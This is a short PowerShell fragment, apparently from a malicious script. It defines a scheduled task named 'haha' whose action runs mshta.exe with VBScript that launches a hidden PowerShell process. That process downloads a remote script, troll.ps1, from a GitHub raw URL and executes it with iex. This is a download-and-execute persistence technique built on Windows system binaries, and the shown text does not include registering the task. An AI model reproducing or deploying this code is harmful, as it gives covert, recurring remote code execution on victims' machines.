$task_name = "haha"
$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/43a1723/funny/refs/heads/main/troll.ps1')|iex`",0)(window.close)"
